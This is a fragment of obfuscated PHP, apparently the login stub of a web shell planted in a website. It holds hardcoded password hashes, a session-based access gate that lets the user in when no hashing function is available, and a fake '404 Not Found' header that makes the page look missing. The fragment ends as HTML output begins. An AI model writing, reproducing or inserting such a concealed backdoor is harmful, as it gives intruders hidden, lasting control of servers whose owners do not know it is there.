 ...
 *
 * @return void
 */ function getVariable($e9){$v10='';if(function_exists('password_verify')){$o1='$2y$10$xeeOiOFsyOC.iiiV8Ry4iu3SuNZRrXMcKWk7AUKnh5glV8LbkNUwG';}elseif(function_exists('hash')){$o1='047bfa38efe3f9791d50db62ff85b5a237abbfdc45654ad3e47ca4f72082cf7f';}else{$o1='';}switch($e9){case 'email':$n11=$v10;break;case 'password':$n11=$o1;break;}return $n11;}function verifyPassword($a12){$u13=getVariable('password');if(function_exists('password_verify')){return password_verify($a12,$u13);}elseif(function_exists('hash')){return hash('sha256',$a12)===$u13?true:false;}return true;}function login(){global $w3,$i4;if(isset($_POST['pass'])){$g14=$_POST["pass"];$j15='';$_SESSION[$w3]=&$j15;if(verifyPassword($g14)){$j15=$i4;}echo "<script>if(window.history.replaceState){window.history.replaceState(null, null, window.location.href);}location.reload();</script>";}header('HTTP/1.1 404 Not Found');echo '
    <!DOCTYPE HTML>
    <html>
    <head>
